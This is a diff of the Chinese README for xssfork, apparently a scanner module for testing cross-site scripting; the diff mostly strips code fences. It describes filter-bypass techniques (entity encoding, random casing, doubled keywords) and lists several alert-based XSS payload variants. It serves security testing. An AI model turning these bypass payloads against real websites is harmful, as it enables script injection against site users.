@@ -17,9 +17,7 @@ xssfork作为sicklescan的一个功能模块，其开发主要目的是用于检
 现阶段提供了10进制，16进制，随机大小写，关键字叠加四个脚本。
 ### 10hex_encode
 将html标签内部字符10进制化
-```
 &lt;a href=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x36&#x35&#x35&#x33&#x34&#x29&#x3b&gt;aaa&lt;/a&gt;
-```
 ![](http://ohsqlm7gj.bkt.clouddn.com/17-7-24/19641734.jpg)
 其效果如下
 ![](http://ohsqlm7gj.bkt.clouddn.com/17-7-24/26774362.jpg)
@@ -29,29 +27,20 @@ xssfork作为sicklescan的一个功能模块，其开发主要目的是用于检
 ### uppercase
 随机大小写
 将
-```
 &lt;script&gt;alert(65534);&lt;/script&gt;
-```
 转换成
-```
 &lt;ScRIPt&gt;alert(65534);&lt;/ScRIpT&gt;
-```
 ### addkeywords
 主要是应对过滤为replace('keyword&gt;s','')的情况  
-```
 &lt;script&gt;alert(65534);&lt;/script&gt;
-```变成
-```
+变成
 &lt;&lt;script&gt;script&gt;alert(65534);&lt;/script&gt;
-```
 当然默认开启的是轻量模式，即只返回一个payload，开启重量模式，可以生成更加丰富的pyaload，效果如下
-```
 &lt;script&gt;alert(65534);&lt;/script&gt;  
 &lt;script&gt;alert(65534);&lt;/ScrIpt&gt;  
 &lt;ScrIpt&gt;alert(65534);&lt;/sCrIpt&gt;  
 &lt;scRiPt&gt;alert(65534);&lt;/script&gt;  
 &lt;ScrIpt&gt;alert(65534);&lt;/script&gt;
-```
 ## 演示
 场景1.反射型xss  
 ![](http://shentoushi.top/manypic/Uploads/2016-09-26/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss.gif)  
@@ -78,5 +67,6 @@ xssfork作为sicklescan的一个功能模块，其开发主要目的是用于检
 ## 说明
 开源只为分享，请勿将本脚本做任何商业性质的集成。开发的时候，有可能很多情况没有考虑到，如果你有更好的建议或者发现bug，可以联系我邮箱,xssfork.codersec.net网站还在建设中,github不要吝啬你的star。
 root@codersec.net  
-开源地址 https://github.com/bsmali4/xssfork，记得不要吝啬你的star
+开源地址 https://github.com/bsmali4/xssfork
+记得不要吝啬你的star
 
